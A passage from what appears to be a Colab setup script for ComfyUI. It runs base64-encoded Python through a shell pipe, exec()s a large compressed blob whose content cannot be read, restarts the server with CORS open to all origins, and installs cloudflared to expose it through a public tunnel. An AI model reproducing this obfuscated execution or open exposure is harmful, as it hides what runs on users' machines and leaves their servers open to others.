+8jOWFieW9see7huiFu+ecn+Wunu+8jOeUteW9see6p+mrmOa4heeUu+i0qOOAgiIKICAgICAgICBpZiBpc2luc3RhbmNlKG4uZ2V0KCJwcm9wZXJ0aWVzIiksIGRpY3QpOgogICAgICAgICAgICBuWyJwcm9wZXJ0aWVzIl0ucG9wKCJmZWlob3VfaDNfb3B0aW1pemVyX2xhc3RfcmVzdWx0IiwgTm9uZSkKICAgICAgICBrZWVwLmFwcGVuZChuKQogICAgcmV0dXJuIGtlZXAKCmZvciB3Zl9wIGluIGxpc3Qod2ZfZGlyLmdsb2IoIiouanNvbiIpKToKICAgIHdmID0ganNvbi5sb2Fkcyh3Zl9wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKSkKICAgIHdmWyJub2RlcyJdID0gY2xlYW5fbm9kZXMod2YuZ2V0KCJub2RlcyIsIFtdKSkKICAgIGZvciBzZyBpbiB3Zi5nZXQoImRlZmluaXRpb25zIiwge30pLmdldCgic3ViZ3JhcGhzIiwgW10pOgogICAgICAgIHNnWyJub2RlcyJdID0gY2xlYW5fbm9kZXMoc2cuZ2V0KCJub2RlcyIsIFtdKSkKICAgIHZhbGlkX2lkcyA9IHtuLmdldCgiaWQiKSBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pfQogICAgaWYgImxpbmtzIiBpbiB3ZiBhbmQgaXNpbnN0YW5jZSh3ZlsibGlua3MiXSwgbGlzdCk6CiAgICAgICAgd2ZbImxpbmtzIl0gPSBbbCBmb3IgbCBpbiB3ZlsibGlua3MiXSBpZiBsWzFdIGluIHZhbGlkX2lkcyBhbmQgbFszXSBpbiB2YWxpZF9pZHNdCiAgICAgICAgdmFsaWRfbGlua19pZHMgPSB7bFswXSBmb3IgbCBpbiB3ZlsibGlua3MiXX0KICAgICAgICBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pOgogICAgICAgICAgICBmb3IgaW5wIGluIG4uZ2V0KCJpbnB1dHMiLCBbXSk6CiAgICAgICAgICAgICAgICBpZiBpbnAuZ2V0KCJsaW5rIikgaXMgbm90IE5vbmUgYW5kIGlucC5nZXQoImxpbmsiKSBub3QgaW4gdmFsaWRfbGlua19pZHM6CiAgICAgICAgICAgICAgICAgICAgaW5wWyJsaW5rIl0gPSBOb25lCiAgICBuZXdfbmFtZSA9IHdmX3AubmFtZQogICAgaWYgIuWNg+mXriIgbm90IGluIG5ld19uYW1lIGFuZCAicXdlbiIgbm90IGluIG5ld19uYW1lLmxvd2VyKCk6CiAgICAgICAgaWYgIjA4XyIgaW4gbmV3X25hbWU6CiAgICAgICAgICAgIG5ld19uYW1lID0gIjA4X+WFqOiDveS4gOS9k1/ljZXph4fmnoHpgJ8uanNvbiIKICAgICAgICBlbGlmICIwOV8iIGluIG5ld19uYW1lOgogICAgICAgICAgICBuZXdfbmFtZSA9ICIwOV/lhajog73kuIDkvZNf5LqM6YeH57K+5L+uLmpzb24iCiAgICAgICAgZWxpZiAiMTBfIiBpbiBuZXdfbmFtZToKICAgICAgICAgICAgbmV3X25hbWUgPSAiMTBf5YWo6IO95LiA5L2TXzNE5pS+5aSn6ZSB6IS4Lmpzb24iCiAgICBvdXRfcCA9IHdmX2RpciAvIG5ld19uYW1lCiAgICBvdXRfcC53cml0ZV90ZXh0KGpzb24uZHVtcHMod2YsIGVuc3VyZV9hc2NpaT1GYWxzZSwgaW5kZW50PTIpLCBlbmNvZGluZz0idXRmLTgiKQogICAgaWYgb3V0X3AgIT0gd2ZfcCBhbmQgd2ZfcC5leGlzdHMoKToKICAgICAgICB3Zl9wLnVubGluaygpCgpwcmludCgiQ0xFQU5VUF9TVUNDRVNTOiIsIFtwLm5hbWUgZm9yIHAgaW4gc29ydGVkKHdmX2Rpci5nbG9iKCIqLmpzb24iKSldKQoKIyBSZW5hbWUgd2ViLyouanMgdG8gbWluaW1heF9oM19jbGVhbl8qLmpzIGFuZCB1cGRhdGUgaW1wb3J0CmltcG9ydCBzdWJwcm9jZXNzCnN1YnByb2Nlc3MucnVuKCIiIgpjZCAvY29udGVudC9Db21meVVJL2N1c3RvbV9ub2Rlcy9Db21meVVJLUZlaUhvdS1FYXN5LUgzL3dlYiAyPi9kZXYvbnVsbCB8fCBleGl0IDAKZm9yIGYgaW4gZmVpaG91X2Vhc3lfaDNfKi5qczsgZG8KICAgIFsgLWUgIiRmIiBdIHx8IGNvbnRpbnVlCiAgICBuZXdfZj0kKGVjaG8gIiRmIiB8IHNlZCAncy9mZWlob3VfZWFzeV9oM18vbWluaW1heF9oM19jbGVhbl8vJykKICAgIG12IC1mICIkZiIgIiRuZXdfZiIKICAgIFsgLWUgIiR7Zn0uZ3oiIF0gJiYgbXYgLWYgIiR7Zn0uZ3oiICIke25ld19mfS5neiIKZG9uZQppZiBbIC1mIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzIF07IHRoZW4KICAgIHNlZCAtaSAncy9mZWlob3VfZWFzeV9oM191aS5qcy9taW5pbWF4X2gzX2NsZWFuX3VpLmpzL2cnIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCiAgICBnemlwIC1rIC1mIC02IG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCmZpCiIiIiwgc2hlbGw9VHJ1ZSkK | base64 -d | python3", shell=True)

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

import zlib as _vz, base64 as _vb; exec(_vz.decompress(_vb.b64decode("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")).decode("utf-8"))
_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
def _is_port_open(port=8188):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok = (s.connect_ex(("127.0.0.1", port)) == 0)
    s.close()
    return ok


# Auto-deploy 🔥YZ原版改_无限时长60秒自动接力工作流.json
try:
    import os, zlib, base64
    _wf_dir = '/content/ComfyUI/user/default/workflows'
    os.makedirs(_wf_dir, exist_ok=True)
    _inf_bytes = zlib.decompress(base64.b64decode('...'))
    with open(os.path.join(_wf_dir, '🔥YZ原版改_无限时长60秒自动接力工作流.json'), 'wb') as _f:
        _f.write(_inf_bytes)
except Exception as _e:
    pass

print("🔄 正在重启 ComfyUI 引擎并重新扫描当前配置的自定义节点与模型...")
subprocess.run(["pkill", "-9", "-f", "main.py"], check=False)
time.sleep(1)
if True:
    print("🚀 正在后台启动 ComfyUI 引擎...")
    subprocess.Popen(
        ["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"],
        cwd="/content/ComfyUI",
        start_new_session=True
    )
    for _ in range(120):
        if _is_port_open(8188):
            break
        time.sleep(0.5)

for _pw in range(3):
    try:
        urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8188/api/object_info", headers={"User-Agent": "Mozilla/5.0", "Accept-Encoding": "gzip"}), timeout=120).read()
        break
    except Exception:
        time.sleep(2)

def _ensure_cf_tunnel():
    cf_url = ""
    if os.path.exists("/content/cf.log"):
        txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
        if m and subprocess.run(["pgrep", "-x", "cloudflared"], capture_output=True).returncode == 0:
            candidate = m.group(0)
            try:
                r = urllib.request.urlopen(urllib.request.Request(candidate + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=4)
                if r.status == 200:
                    return candidate
            except Exception:
                pass
    subprocess.run(["pkill", "-9", "-x", "cloudflared"], check=False)
    if not os.path.exists("/usr/bin/cloudflared") and not os.path.exists("/usr/local/bin/cloudflared"):
        subprocess.run("wget -q -nc https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && dpkg -i cloudflared-linux-amd64.deb", shell=True)
    print("🌐 正在建立 Cloudflare 专属隧道并等待全球 DNS/SSL 证书生效...")
    subprocess.Popen(
        ["bash", "-c", "nohup cloudflared tunnel --protocol http2 --ha-connections 4 --url http://127.0.0.1:8188 > /content/cf.log 2>&1 &"],
        start_new_session=True
    )
    for _ in range(50):
        time.sleep(0.5)
